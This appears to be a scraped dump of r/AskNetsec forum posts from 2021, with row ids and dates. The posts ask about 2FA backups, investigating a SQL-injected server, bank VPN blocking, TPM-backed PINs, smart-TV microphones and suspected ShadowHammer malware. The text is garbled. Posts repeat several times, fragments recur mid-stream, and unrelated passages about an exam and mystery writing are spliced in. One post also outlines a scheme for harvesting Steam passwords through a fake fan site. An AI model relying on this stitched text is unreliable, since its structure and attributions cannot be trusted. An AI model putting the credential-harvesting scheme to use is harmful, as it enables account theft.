So now I have my provisional pass, and I'll have to pay my annual subs, and the exam scraped the surface of my knowledge, but was it worth it? I genuinely think I'll only be able to answer that with the benefit of hindsight a few years from now.",2021-06-27

2. any sites using 2FA with an authenticator app (google authenticator, authy, etc), will leave me stuck without my phone

What would you consider best practice to handle this, particularly if you have to travel where it would be awkward to carry backup paper QR codes/etc. Also feel like it would be risky to carry around QR codes like that.

Some thoughts:

- I just ordered 2 yubikeys, but not all sites support these where I can get totally locked out
- I could buy a cheap android phone, and regenerate 2FA QR codes on all sites that I use them, and setup both my primary iPhone and backup Android authenticator apps to have the OTP's available

- I could buy a cheap android phone, and regenerate 2FA QR codes on all sites that I use them, and setup both my primary iPhone and backup Android authenticator apps to have the OTP's available

2094,omwnv0,Having a hard time investigating/recovering from server hack," Hi everyone. For context: I'm a sysadmin with a decent understanding of offensive hacking, and I run a few LAMP servers on DigitalOcean for personal niche websites and a few clients' websites. A couple months ago I put all my domains on a bug bounty (openbugbounty org) to help me identify weaknesses as I continue growing. (I've had only minor exploits mentioned, and most of the researchers violate the rules I wrote, ie. dont attack subdomains, don't report self-xss, etc ). Since this started, I would occasionally see my MYSQL server drop, maybe twice a month. I would reboot my server and all would be well (in retrospect I see how dumb this attitude was). I've also begun getting a TON of log traffic, as one would expect.

Here's where I make a huge embarrassing mistake; I decided to use my main production server to host the development environment for a new version of a CMS I wrote in PHP/MySQL. I was working on dev(.)mysite(.)com, which was on the same server as mysite(.)com, and used the same MySQL server. I really can't explain my thinking on this one. At my 9-5 I'm very strict about having the developers keep dev and production environments separate, so this is out of character for me. I guess my level of security-consciousness is proportional to the amount of explaining I'll have to do.

About a week or ago I find my CMS won't allow me to login. I checked the DB and there are hundreds and hundreds of new entries in the *users* table. Interestingly, the user account I was trying to login with looked untouched. I obviously got caught slipping with a SQLi vulnerability. No other tables were affected that I know of, as this CMS uses an un-privileged DB account. I shut the dev site down, and moved it to a local LAMP server on my home network. Better late than never. Now I'm trying to figure out what happened, and how far the breach went.

I have over 1,000 log files in /var/log/apache2, and most other directories in /var/log/ are also packed to the gills. There's too much noise (presumably) from the bug bounty for me to analyze anything. I spent a day writing python scripts to analyze stuff. I have one that compiles all website-specific logs into respective master files, and runs scalp.py on them, outputting everything to an HTML file I can navigate. There's so many random injection attempts that the script is almost useless to me. I wrote another script to analyze the /var/log/auth.log file and at least count and sort the types of messages. The output can be found [https://pastebin.com/grGhT0Qx](https://pastebin.com/grGhT0Qx) . Sorry if the output is confusing, I don’t understand what a lot of the messages mean, so just did a basic count for now.

I only saw on single SSH login that I didn't recognize, and it was on the account smmsp. This also lead me to see in my mail log files that somebody had found an old forum install I forgot about, and had been using it to send massive amounts of spam emails to email addresses in Russia. I've removed the account, the forum, and uninstalled sendmail.

I'm at the point of the investigation where I risk going down the wrong path and wasting valuable time.

So here’s my questions:

1. Are there any programs that will do an in-depth audit of my logs? I did a bunch of searching, but almost nothing fits the bill besides scalp.py, and that’s only for website-specific log files. I’m more than happy to expand my own scripts to do this if I need to, but would request someone push me in the direction of the information I need to start studying.
2. Is there an application that could blacklist an IP address if it recognizes injection attempts? I’m sure a WAF could pull something like this off, but have never used any so I would be swinging in the dark by picking one. I can write a script to do it too, using the logs to identify IPs, but is there a specific method of blacklisting that I should be leaning towards if I need to do this on my own?

2097,ojr8ka,Banks Blocking Anonymous VPN Providers and Fraud Question,"Hi everyone.

I noticed banks are increasing the blocking of anonymizer VPN providers to deter fraud. When connecting from a VPN, the bank may block the login attempt, prompt the login process with a security question/answer, or in some more extreme cases, disable or close the account requiring the affected user to go into a branch to verify their identity with bank staff. 

I understand why this is occurring with the increased fraud. However, my question is, what are the back-end providers banks are using to monitor for, detect, and prevent log-on from VPN providers?

Google research suggests several banks and financial providers use a company called Maxmind ([https://www.maxmind.com/en/home](https://www.maxmind.com/en/home)).

2101,oi3wll,Is it a good idea to use 1 email address per company you interact with?,"My email was leaked, so of course I started getting massive amounts of spam. I also got a new type of spam: subscription spam, which is where bots sign you up for 100s of newsletters that don't have captchas or anything. Newsletters are much less likely to be auto marked as spam so they often go straight to inbox.

Anyway that email address nearly unusable until I spent a bunch of time cleaning it up. This got me wishing I could've just dumped the email address and moved on (I couldn't do that since it was tied to too many things).  Imagine if I could have just updated the email address on 1 website- problem solved. That also helps security, I think-- if someone steals one of your email accounts, the worst they can do is log into 1 company.

The main problem I can see with this approach is that it is kind of difficult to maintain dozens of email addresses. I'm pretty sure Google auto deletes gmail accounts after 1-2 years of you not logging in. So you'd need to manually log into each email address occasionally. Also if you are talking to customer service and they ask you for your email address, you might not be able to remember unless you follow an obvious naming convention.

2108,oc5jlt,Never Seen Anyone Report this Security Flaw in the Last 40 Years?,"(Note this is an edit, to hopefully better explain what I was talking about here).

Phishing is very common, and not only that, very easy to detect.   Someone sends you an email that attempts to get you to click a link that will send you to a site that looks like the login screen for a popular site like Ebay, Amazon, Microsoft, etc.

What I have never seen discussed very often at all in the last 40 years or talked about is another possible security flaw.   What if someone purposely sets up a real website.   Key word is real.   Not a phish, not a fake, not a copy of a popular site.   Instead they set up a real site and this site is run by a hacker or a group of hackers.

A  hacker could use this trick:  They create a legitimate website.   Say a  computer gaming website.   They require people to create an account to  access the website, where people have to enter an email and a password.    They delete or edit the password file, so that people trying to login,  will see, your password is incorrect and get a message ""try again"".     So someone trying to login to the legitimate website, will ""cycle thru  all their passwords"".

A possible ""real"" scenario of someone trying this:    For example, if you want to hack into Steam accounts, this is how I would do it:   1st) Get a list of upcoming planned to be released games on Steam,  2nd) Check for a soon to be released game where there are no fan websites yet,   3rd) Create a fan website for the upcoming to be released game  (prior to the games release date),    4th) Make sure you require people to create an account to use your fan site, 5th) Now after the game is released, people buy it and may search for information on how to play the game, and they will go to your site and type in an email and password to create their account, 6th) You as the hacker and site administrator, do what I suggested in the paragraph prior to this one.

This is just an example scenario.   The security flaw, is that phishing is VERY easy to detect, but how would you know if your favorite site  (think of any site you visit every day), is actually being run by a hacker or group of hackers?     Maybe when you go to search for information on the game that you just purchased, that site is being run by a hacker.

Phishing is very easily detectable.   But how would you detect if it is actually a real site?   How would you know that this real site is being run by a hacker or group of hackers?

- I just ordered 2 yubikeys, but not all sites support these where I can get totally locked out
- I could buy a cheap android phone, and regenerate 2FA QR codes on all sites that I use them, and setup both my primary iPhone and backup Android authenticator apps to have the OTP's available

It's popular today for people to set their whodunnit mysteries back in the interwar period when Golden Age mystery fiction was written, or even earlier.

But what's missed here, in my view, is that those writers weren't trying to hide from modernity. They were just setting their stories in their own society. Further, readers nowadays are too far removed from Victorian society to notice that heroes like Sherlock Holmes were in fact introducing the audience to chemistry and forensics that was cutting-edge at the time.

So as I start my first series set in the modern day (having previously written a few standalones and a historical series) I want to avoid shying away from the effects of the most modern technology on crime.

2139,omwnv0,Having a hard time investigating/recovering from server hack," Hi everyone. For context: I'm a sysadmin with a decent understanding of offensive hacking, and I run a few LAMP servers on DigitalOcean for personal niche websites and a few clients' websites. A couple months ago I put all my domains on a bug bounty (openbugbounty org) to help me identify weaknesses as I continue growing. (I've had only minor exploits mentioned, and most of the researchers violate the rules I wrote, ie. dont attack subdomains, don't report self-xss, etc ). Since this started, I would occasionally see my MYSQL server drop, maybe twice a month. I would reboot my server and all would be well (in retrospect I see how dumb this attitude was). I've also begun getting a TON of log traffic, as one would expect.

Here's where I make a huge embarrassing mistake; I decided to use my main production server to host the development environment for a new version of a CMS I wrote in PHP/MySQL. I was working on dev(.)mysite(.)com, which was on the same server as mysite(.)com, and used the same MySQL server. I really can't explain my thinking on this one. At my 9-5 I'm very strict about having the developers keep dev and production environments separate, so this is out of character for me. I guess my level of security-consciousness is proportional to the amount of explaining I'll have to do.

About a week or ago I find my CMS won't allow me to login. I checked the DB and there are hundreds and hundreds of new entries in the *users* table. Interestingly, the user account I was trying to login with looked untouched. I obviously got caught slipping with a SQLi vulnerability. No other tables were affected that I know of, as this CMS uses an un-privileged DB account. I shut the dev site down, and moved it to a local LAMP server on my home network. Better late than never. Now I'm trying to figure out what happened, and how far the breach went.

I have over 1,000 log files in /var/log/apache2, and most other directories in /var/log/ are also packed to the gills. There's too much noise (presumably) from the bug bounty for me to analyze anything. I spent a day writing python scripts to analyze stuff. I have one that compiles all website-specific logs into respective master files, and runs scalp.py on them, outputting everything to an HTML file I can navigate. There's so many random injection attempts that the script is almost useless to me. I wrote another script to analyze the /var/log/auth.log file and at least count and sort the types of messages. The output can be found [https://pastebin.com/grGhT0Qx](https://pastebin.com/grGhT0Qx) . Sorry if the output is confusing, I don’t understand what a lot of the messages mean, so just did a basic count for now.

I only saw on single SSH login that I didn't recognize, and it was on the account smmsp. This also lead me to see in my mail log files that somebody had found an old forum install I forgot about, and had been using it to send massive amounts of spam emails to email addresses in Russia. I've removed the account, the forum, and uninstalled sendmail.

I'm at the point of the investigation where I risk going down the wrong path and wasting valuable time.

So here’s my questions:

1. Are there any programs that will do an in-depth audit of my logs? I did a bunch of searching, but almost nothing fits the bill besides scalp.py, and that’s only for website-specific log files. I’m more than happy to expand my own scripts to do this if I need to, but would request someone push me in the direction of the information I need to start studying.
2. Is there an application that could blacklist an IP address if it recognizes injection attempts? I’m sure a WAF could pull something like this off, but have never used any so I would be swinging in the dark by picking one. I can write a script to do it too, using the logs to identify IPs, but is there a specific method of blacklisting that I should be leaning towards if I need to do this on my own?

2142,ojr8ka,Banks Blocking Anonymous VPN Providers and Fraud Question,"Hi everyone.

I noticed banks are increasing the blocking of anonymizer VPN providers to deter fraud. When connecting from a VPN, the bank may block the login attempt, prompt the login process with a security question/answer, or in some more extreme cases, disable or close the account requiring the affected user to go into a branch to verify their identity with bank staff. 

I understand why this is occurring with the increased fraud. However, my question is, what are the back-end providers banks are using to monitor for, detect, and prevent log-on from VPN providers?

Google research suggests several banks and financial providers use a company called Maxmind ([https://www.maxmind.com/en/home](https://www.maxmind.com/en/home)). 

Does anyone know of any other back-end providers used to detect fraud during the log-on process?

2146,oi3wll,Is it a good idea to use 1 email address per company you interact with?,"My email was leaked, so of course I started getting massive amounts of spam. I also got a new type of spam: subscription spam, which is where bots sign you up for 100s of newsletters that don't have captchas or anything. Newsletters are much less likely to be auto marked as spam so they often go straight to inbox.

Anyway that email address nearly unusable until I spent a bunch of time cleaning it up. This got me wishing I could've just dumped the email address and moved on (I couldn't do that since it was tied to too many things).  Imagine if I could have just updated the email address on 1 website- problem solved. That also helps security, I think-- if someone steals one of your email accounts, the worst they can do is log into 1 company.

The main problem I can see with this approach is that it is kind of difficult to maintain dozens of email addresses. I'm pretty sure Google auto deletes gmail accounts after 1-2 years of you not logging in. So you'd need to manually log into each email address occasionally. Also if you are talking to customer service and they ask you for your email address, you might not be able to remember unless you follow an obvious naming convention.

2153,oc5jlt,Never Seen Anyone Report this Security Flaw in the Last 40 Years?,"(Note this is an edit, to hopefully better explain what I was talking about here).

Phishing is very common, and not only that, very easy to detect.   Someone sends you an email that attempts to get you to click a link that will send you to a site that looks like the login screen for a popular site like Ebay, Amazon, Microsoft, etc.

What I have never seen discussed very often at all in the last 40 years or talked about is another possible security flaw.   What if someone purposely sets up a real website.   Key word is real.   Not a phish, not a fake, not a copy of a popular site.   Instead they set up a real site and this site is run by a hacker or a group of hackers.

A  hacker could use this trick:  They create a legitimate website.   Say a  computer gaming website.   They require people to create an account to  access the website, where people have to enter an email and a password.    They delete or edit the password file, so that people trying to login,  will see, your password is incorrect and get a message ""try again"".     So someone trying to login to the legitimate website, will ""cycle thru  all their passwords"".

A possible ""real"" scenario of someone trying this:    For example, if you want to hack into Steam accounts, this is how I would do it:   1st) Get a list of upcoming planned to be released games on Steam,  2nd) Check for a soon to be released game where there are no fan websites yet,   3rd) Create a fan website for the upcoming to be released game  (prior to the games release date),    4th) Make sure you require people to create an account to use your fan site, 5th) Now after the game is released, people buy it and may search for information on how to play the game, and they will go to your site and type in an email and password to create their account, 6th) You as the hacker and site administrator, do what I suggested in the paragraph prior to this one.

This is just an example scenario.   The security flaw, is that phishing is VERY easy to detect, but how would you know if your favorite site  (think of any site you visit every day), is actually being run by a hacker or group of hackers?     Maybe when you go to search for information on the game that you just purchased, that site is being run by a hacker.

Phishing is very easily detectable.   But how would you detect if it is actually a real site?   How would you know that this real site is being run by a hacker or group of hackers?    This is the crux of the matter and where there is some security risk if people don't consider this could happen.",2021-07-02

In practice (I know that *in theory* every password you use should be long and complex), the strength of your passwords is dependent on what additional layers of protection are available, if any. Typically you'd feel less secure using, say, a fifteen character password as a master password, but might feel comfortable using that same fifteen character password for an online account protected by 2FA.

I'm wondering whether there are any loose guidelines for determining how much less secure/long/complex your passwords can afford to be when additional layers of protection are present. Personally, I need to remember at least five unique passwords. Some are very long diceware passwords, while others are substantially shorter and easier to remember. How much I'm willing to give up in terms of security in exchange for ease of use depends on whether those passwords stand completely alone without any additional layers of protection (as an example, the password I use to sign into my main cloud account is long and complex and 2FA isn't enabled - I wanted a scenario where I know I can always log into this account, even if I were to lose my phone and laptop at the same time or something else happened that made my 2FA codes unrecoverable).

I recently enabled Bitlocker drive encryption and would like to switch from using a local account password to a local PIN backed by TPM. Because two new layers of security have been introduced on my machine - the Bitlocker drive encryption and the TPM backing available to PINs - I was considering using something easier to type and remember as my PIN, since my current local account password is a pain to type. I feel like a PIN in this scenario can afford to be shorter and less complex because of that TPM backing and lockout threshold - I just don't know how much less secure.

2169,ouvuiy,"Bought a Smart Google TV with a built-in mic (on the unit, not the remote). What should I do to protect my audio privacy?","**The entirety of my privacy concerns (with regards to a smart TV) amounts to this: I don't want hackers, or Google, listening to my conversations.** That's it. I personally don't care about companies tracking what content I watch or what games I play, as there isn't any information there that would be of interest to anyone. I'm not interested in arguing about what my privacy concerns should be. I'm just looking for advice on the microphone issue.

The TV I bought is a 2021 Sony Bravia X90J with Google TV. I plan on using the Google TV OS for watching YouTube and Hulu, and for sideloading Android apps. I bought this particular model for its excellent 4K HDR display and HDMI 2.1 support which I'll need to get the most out of my Xbox Series X. I was initially led to believe that the only microphone was on the remote, which I could disable by turning Bluetooth off, as that is how the [audio is transmitted](https://www.sony.com/electronics/support/televisions-projectors-lcd-tvs-android-/xr-65x90j/articles/00171448). But after looking more closely at the [documentation](https://www.sony.co.in/electronics/support/televisions-projectors-lcd-tvs-android-/xr-55x90j/articles/00201366), I've realized that there is actually a mic on the TV itself, for ""hands-free voice controls"". While this is concerning, very few TVs in my budget have HDMI 2.1 support and a well-rated display, which are my main criteria.

There is a switch to turn the mic off, and of course I plan on disabling Google Assistant and configuring all of the privacy settings on the TV to my liking. But that's all software-related, and I've heard stories of microphones being turned on remotely, which disturbs me.

Here are some safety measures that I've thought of based on discussions I've read online:

* As I've said already, disabling the mic using the button and disabling all audio features
* Having a secure WiFi password that's unlikely to be cracked
* Attaching a Pi-Hole to the network? (I'm tech-savvy enough to make one and set it up, but I don't exactly know why it's necessary or how it would help, I've just seen it mentioned a bunch.)
* Making a separate Google account so that my voice isn't tied to my identity
* (Last resort, if it's still insecure): disabling WiFi, making it a ""dumb TV"" and using other devices for streaming (although I really would have liked to sideload Android apps without having to get an extra box)

Will these be enough? Is there anything else I should do? Are some of these unnecessary? Thanks for your input.",2021-07-30

I bought this particular model for its excellent 4K HDR display and HDMI 2.1 support which I'll need to get the most out of my Xbox Series X. I was initially led to believe that the only microphone was on the remote, which I could disable by turning Bluetooth off, as that is how the [audio is transmitted](https://www.sony.com/electronics/support/televisions-projectors-lcd-tvs-android-/xr-65x90j/articles/00171448). But after looking more closely at the [documentation](https://www.sony.co.in/electronics/support/televisions-projectors-lcd-tvs-android-/xr-55x90j/articles/00201366), I've realized that there is actually a mic on the TV itself, for ""hands-free voice controls"". While this is concerning, very few TVs in my budget have HDMI 2.1 support and a well-rated display, which are my main criteria.

There is a switch to turn the mic off, and of course I plan on disabling Google Assistant and configuring all of the privacy settings on the TV to my liking. But that's all software-related, and I've heard stories of microphones being turned on remotely, which disturbs me.

Here are some safety measures that I've thought of based on discussions I've read online:

* As I've said already, disabling the mic using the button and disabling all audio features
* Having a secure WiFi password that's unlikely to be cracked
* Attaching a Pi-Hole to the network? (I'm tech-savvy enough to make one and set it up, but I don't exactly know why it's necessary or how it would help, I've just seen it mentioned a bunch.)
* Making a separate Google account so that my voice isn't tied to my identity
* (Last resort, if it's still insecure): disabling WiFi, making it a ""dumb TV"" and using other devices for streaming (although I really would have liked to sideload Android apps without having to get an extra box)

Will these be enough? Is there anything else I should do? Are some of these unnecessary? Thanks for your input.",2021-07-30

2207,oe9sx1,Is my `digital life design` good enough?,"Hi. I'm trying to organize my digital life and make it as simple as possible. I'm going to be really happy after I finalize this design. So I do appreciate your input. Especially if you are great at cyber security

Some constraints:

- I'm a full time backpacker with no home. If my things are lost/stolen, flying to a friend/relative to get my backup disk would cost too much money and the data might be too old. So I must use cloud to store my backups. 

- I don't trust any password managers, cloud providers, Apple, Google and such. Maybe they are nice today but I'm not sure what they or government would do 30 years later. I trust whatever I have control over; open source software that runs on my machine. 

Here's the design draft

> Pw0 for cloud1, cloud2
> 
> Pw0 for email account associated to clouds. Email account is created because cloud providers ask for it
> 
> Pw1 for vault1 - It has passwords, cards (purpose of separating v1 and v2 is to keep v1 usually locked)
> 
> Pw1 for vault2 - It has everything else 
> 
> Pw2 for encryption of zip file - I will access this from an untrusted computer/phone after my things are stolen. This device could belong to a hotel, stranger or police. It has things to help me prove my ID and access money to buy local clean phone and computer so I can access all vaults and continue my life as if nothing happened. Zip because I might not able to install the software to unlock a vault.
> 
> That's it. I just need to remember 3 passwords. Vaults and zip are encrypted and synced to clouds. First cloud works with Cryptomator and syncs instantly when there's connection. Second cloud works with an *alternative* to Cryptomator (in case of data corruption, Cryptomator software bug) and syncs *once a month* (in case instant sync fails and also kind of as an older backup). I don't remember needing versioning in backups in last 15 years. *Two clouds* because one's domain could be blocked by the local government or could lock me out or its software might fail to work when I need it to work.

> As for PW management: I use incognito browser, pay attention to SSL and domain, clear the clipboard after I copy paste a sensitive password. Using a PW manager software safely would increase complexity (gotta back that up too) and I'm not sure if I want that. I think I could keep a text file of bank, broker, government account passwords and credit card info in vault1. I'd enter passwords from computer screen to my phone manually.

I'm not trying to protect myself against the FBI and I'm not a public figure, though I earn online. I just want to protect myself enough to feel safe and relaxed, considering I am not rich, have no home, *carry all my possessions with me*, am fully reliant on internet and I'm on my own. 

Could I get your comment on this design? Is it good enough?

Some other questions:

- I don't have an alternative to Cryptomator yet. Any suggestions? 

- I'm a little worried about being dependent on terminal but, is there an idiot-proof simple script to encrypt and decrypt files individually? Or something with a GUI? Maybe something that would choose the right encryption algorithm when there's new vulnerabilities I wouldn't know about? Maybe I need two versions of this script instead of two softwares like Cryptomator.",2021-07-05

As my title suggests, I’m really concerned i have some sort of malware, keylogger or RAT on my pc. I started noticing something was off two weeks ago when i saw that theres a file called “temp” that keeps constantly being shown on my quick access section in the file explorer, it leads to an “Asus Live Update” folder. Note that i have not opened or used this service in i dont even know how long and made sure to disable it from startup a looong time ago. I search up some of the files that were recently modified online and to my horror i find they are associated with an attack called “shadowhammer”, which is what lead me to this subreddit.

 I looked up my mac address to see if it was compropmised but it said i wasnt, i still wasnt very reassured tho. I thought it was a one time thing, but the files in this folder are constantly being modified over the two week period, theyre called: idx.ini, logtrack.txt and one called cdat.tmp, the lattee of which has a .sign file with my laptop model (X451uj.sign), i opened it using an online reader and I’m not sure what to make of it. I go on the task manager to see if theres a reason this is happening and everytime i press on the performance tab, i get the blue screen of death and my pc reatarts, this still happens even now. However, one time i was able to catch a glimpse before this happened and i found i had a monitor for “Ethernet virtualbox host only network adapter”, even though i do no have a virual machines on my pc and even had virtualbox uninstalled a long time ago. I ran an ipconfig just to make sure i wasnt imaging things and it surely was there. I ran both malware bites and every scan offered by windows defender but nothing pops up for me.

2212,oc13pl,Password manager Windows Hello Integration,"Recently, I got really frustrated with trying to get enpass to work with Windows Hello. What I am seeking is not having to type my master password every time I restart the machine or enpass. For enpass, they apparently store a key in the TPM, but require TPM 2.0. However, this did not work in both of my TPM system because enpass said that they do not implement tpm key attestation properly. 

I tried Bitwarden and did not have this issue. However when I turn off Bitwarden, it still did not required me to enter the master password. This got me thinking about how each password manager handle encryption on windows and what are the pros and cons security-wise.

Here's what I notice so far from reading.

* 1password - integrates with windows hello, but does not store the key even if tpm is present. This mean when you restart 1password, you must enter master password. 1Password explain that unlike the Mac with their security enclave, there is no safe way of storing the master password key.
* Bitwarden - product can be unlock using windows hello. It probably stores the key on disk somewhere and is unlocked by windows hello. I am able to start up bitwarden and unlock it using windows hello even without tpm. 
* Dashlane - Integrates with windows Hello and does not talk about TPM requirements but apparently force you to enter the master password every 14 days as a safety measure.
* Enpass - Integrates with windows Hello and stores key in the TPM 2.0 but it has to implement TPM key attestation properly. IF this does not work, then users has to enter master password on enpass start up.
* Last Pass - does not appear to integrate with Hello but uses its own fingerprint integration. I don't think it uses TPM.

Enpass explain that on windows without TPM, you cannot safely store the master password key.  Bitwarden is mum on this. Is Enpass right though? Is storing the master password key without TPM unsafe?",2021-07-02

For example, my mother's tablet stopped working, but she is technically still connected to Gmail and such. If someone somewhere somehow puts his hand on the tablet and manages to make it work, then he can gain access to everything, since they dont ask you for your password once logged in.

2223,p6xttl,"Are there any guidelines for how much weaker your passwords/PINs can afford to be when additional layers of protection (e.g. TPM, 2FA, key files, lockout thresholds, etc.) are present?","This might be a strange question, but I'm curious what this community thinks. In practice (I know that *in theory* every password you use should be long and complex), the strength of your passwords is dependent on what additional layers of protection are available, if any. Typically you'd feel less secure using, say, a fifteen character password as a master password, but might feel comfortable using that same fifteen character password for an online account protected by 2FA.

I'm wondering whether there are any loose guidelines for determining how much less secure/long/complex your passwords can afford to be when additional layers of protection are present. Personally, I need to remember at least five unique passwords. Some are very long diceware passwords, while others are substantially shorter and easier to remember. How much I'm willing to give up in terms of security in exchange for ease of use depends on whether those passwords stand completely alone without any additional layers of protection (as an example, the password I use to sign into my main cloud account is long and complex and 2FA isn't enabled - I wanted a scenario where I know I can always log into this account, even if I were to lose my phone and laptop at the same time or something else happened that made my 2FA codes unrecoverable).

I recently enabled Bitlocker drive encryption and would like to switch from using a local account password to a local PIN backed by TPM. Because two new layers of security have been introduced on my machine - the Bitlocker drive encryption and the TPM backing available to PINs - I was considering using something easier to type and remember as my PIN, since my current local account password is a pain to type. I feel like a PIN in this scenario can afford to be shorter and less complex because of that TPM backing and lockout threshold - I just don't know how much less secure.

2235,ouvuiy,"Bought a Smart Google TV with a built-in mic (on the unit, not the remote). What should I do to protect my audio privacy?","**The entirety of my privacy concerns (with regards to a smart TV) amounts to this: I don't want hackers, or Google, listening to my conversations.** That's it. I personally don't care about companies tracking what content I watch or what games I play, as there isn't any information there that would be of interest to anyone. I'm not interested in arguing about what my privacy concerns should be. I'm just looking for advice on the microphone issue.

The TV I bought is a 2021 Sony Bravia X90J with Google TV. I plan on using the Google TV OS for watching YouTube and Hulu, and for sideloading Android apps. I bought this particular model for its excellent 4K HDR display and HDMI 2.1 support which I'll need to get the most out of my Xbox Series X. I was initially led to believe that the only microphone was on the remote, which I could disable by turning Bluetooth off, as that is how the [audio is transmitted](https://www.sony.com/electronics/support/televisions-projectors-lcd-tvs-android-/xr-65x90j/articles/00171448). But after looking more closely at the [documentation](https://www.sony.co.in/electronics/support/televisions-projectors-lcd-tvs-android-/xr-55x90j/articles/00201366), I've realized that there is actually a mic on the TV itself, for ""hands-free voice controls"". While this is concerning, very few TVs in my budget have HDMI 2.1 support and a well-rated display, which are my main criteria.

There is a switch to turn the mic off, and of course I plan on disabling Google Assistant and configuring all of the privacy settings on the TV to my liking. But that's all software-related, and I've heard stories of microphones being turned on remotely, which disturbs me.

Here are some safety measures that I've thought of based on discussions I've read online:

* As I've said already, disabling the mic using the button and disabling all audio features
* Having a secure WiFi password that's unlikely to be cracked
* Attaching a Pi-Hole to the network? (I'm tech-savvy enough to make one and set it up, but I don't exactly know why it's necessary or how it would help, I've just seen it mentioned a bunch.)
* Making a separate Google account so that my voice isn't tied to my identity
* (Last resort, if it's still insecure): disabling WiFi, making it a ""dumb TV"" and using other devices for streaming (although I really would have liked to sideload Android apps without having to get an extra box)

Will these be enough? Is there anything else I should do? Are some of these unnecessary? Thanks for your input.",2021-07-30

2247,oe9sx1,Is my `digital life design` good enough?,"Hi. I'm trying to organize my digital life and make it as simple as possible. I'm going to be really happy after I finalize this design. So I do appreciate your input. Especially if you are great at cyber security

Some constraints:

- I'm a full time backpacker with no home. If my things are lost/stolen, flying to a friend/relative to get my backup disk would cost too much money and the data might be too old. So I must use cloud to store my backups. 

- I don't trust any password managers, cloud providers, Apple, Google and such. Maybe they are nice today but I'm not sure what they or government would do 30 years later. I trust whatever I have control over; open source software that runs on my machine. 

Here's the design draft

> Pw0 for cloud1, cloud2
> 
> Pw0 for email account associated to clouds. Email account is created because cloud providers ask for it
> 
> Pw1 for vault1 - It has passwords, cards (purpose of separating v1 and v2 is to keep v1 usually locked)
> 
> Pw1 for vault2 - It has everything else 
> 
> Pw2 for encryption of zip file - I will access this from an untrusted computer/phone after my things are stolen. This device could belong to a hotel, stranger or police. It has things to help me prove my ID and access money to buy local clean phone and computer so I can access all vaults and continue my life as if nothing happened. Zip because I might not able to install the software to unlock a vault.
> 
> That's it. I just need to remember 3 passwords. Vaults and zip are encrypted and synced to clouds. First cloud works with Cryptomator and syncs instantly when there's connection. Second cloud works with an *alternative* to Cryptomator (in case of data corruption, Cryptomator software bug) and syncs *once a month* (in case instant sync fails and also kind of as an older backup). I don't remember needing versioning in backups in last 15 years. *Two clouds* because one's domain could be blocked by the local government or could lock me out or its software might fail to work when I need it to work.

> As for PW management: I use incognito browser, pay attention to SSL and domain, clear the clipboard after I copy paste a sensitive password. Using a PW manager software safely would increase complexity (gotta back that up too) and I'm not sure if I want that. I think I could keep a text file of bank, broker, government account passwords and credit card info in vault1. I'd enter passwords from computer screen to my phone manually.

I'm not trying to protect myself against the FBI and I'm not a public figure, though I earn online. I just want to protect myself enough to feel safe and relaxed, considering I am not rich, have no home, *carry all my possessions with me*, am fully reliant on internet and I'm on my own. 

Could I get your comment on this design? Is it good enough?

Some other questions:

- I don't have an alternative to Cryptomator yet. Any suggestions? 

- I'm a little worried about being dependent on terminal but, is there an idiot-proof simple script to encrypt and decrypt files individually? Or something with a GUI? Maybe something that would choose the right encryption algorithm when there's new vulnerabilities I wouldn't know about? Maybe I need two versions of this script instead of two softwares like Cryptomator.",2021-07-05

I thought it was a one time thing, but the files in this folder are constantly being modified over the two week period, theyre called: idx.ini, logtrack.txt and one called cdat.tmp, the lattee of which has a .sign file with my laptop model (X451uj.sign), i opened it using an online reader and I’m not sure what to make of it.

For example, my mother's tablet stopped working, but she is technically still connected to Gmail and such. If someone somewhere somehow puts his hand on the tablet and manages to make it work, then he can gain access to everything, since they dont ask you for your password once logged in.

2254,oc13pl,Password manager Windows Hello Integration,"Recently, I got really frustrated with trying to get enpass to work with Windows Hello. What I am seeking is not having to type my master password every time I restart the machine or enpass. For enpass, they apparently store a key in the TPM, but require TPM 2.0. However, this did not work in both of my TPM system because enpass said that they do not implement tpm key attestation properly. 

I tried Bitwarden and did not have this issue. However when I turn off Bitwarden, it still did not required me to enter the master password. This got me thinking about how each password manager handle encryption on windows and what are the pros and cons security-wise.

Here's what I notice so far from reading.

* 1password - integrates with windows hello, but does not store the key even if tpm is present. This mean when you restart 1password, you must enter master password. 1Password explain that unlike the Mac with their security enclave, there is no safe way of storing the master password key.
* Bitwarden - product can be unlock using windows hello. It probably stores the key on disk somewhere and is unlocked by windows hello. I am able to start up bitwarden and unlock it using windows hello even without tpm. 
* Dashlane - Integrates with windows Hello and does not talk about TPM requirements but apparently force you to enter the master password every 14 days as a safety measure.
* Enpass - Integrates with windows Hello and stores key in the TPM 2.0 but it has to implement TPM key attestation properly. IF this does not work, then users has to enter master password on enpass start up.
* Last Pass - does not appear to integrate with Hello but uses its own fingerprint integration. I don't think it uses TPM.

Enpass explain that on windows without TPM, you cannot safely store the master password key.  Bitwarden is mum on this. Is Enpass right though? Is storing the master password key without TPM unsafe?",2021-07-02

2263,p61mui,2 of my servers got hacked last night around the same time.,"2 of my servers that were running nginx and docker both got hacked by what looks like a worm of some sort about the same time.

OVH sent me an email.  I updated everything and restarted (hoping it was just a docker image that got hacked and not the root of server) and all the erroneous processes stopped but while I was sleeping the server got re-exploited and by morning my host had disabled them.

The only non-docker services I run on the servers are nginx & ssh.  I do have password auth enabled (yeah yeah I know) but I don't think both would have been bruteforced at the same time so this feels like an exploit of some sort.  Are there any major docker vulnerabilities that would allow this?

I have other servers that didn't get touched but they were setup more recently and have latest version of docker on them.

Both servers are now in recovery mode.  I am going to nuke from orbit as soon as I recover data but is there anything quick I should look at before hand to get a clue how they got in?

&#x200B;

edit: I found a docker image common to both servers that had a default SSH password set from a well known project template.  When I logged into hacked server there were a ton of rsync processes and various nefarious processes running so first thing i did was stop the docker service to see if they stopped but they carried on with the docker service stopped.  Does this rule out this container as point of entry?

&#x200B;

edit: I am 90% sure now that it was this default ssh password on docker container that was to blame and servers are actually fine with this container removed.  I am going to delay nuking them from orbit to see if they get rehacked without this container.",2021-08-17

We at r/AskNetsec would like to introduce you to our new ""Segment"" State Of the Sub, For the next few months, this will be released at the end of each month as a way of transparency between the mod team and you guys.

&#x200B;

**New Moderators**

In the wake of the old mods, Seven new moderators have been added to help around. They have individually been selected based on experience in the field and a few other selected qualities. They are subject to the same rules as the rest of you, so please feel free to report any all rule-breaking posts, even if it comes from a moderator. (Abuse will result in a perm ban)

**The** ***filter***

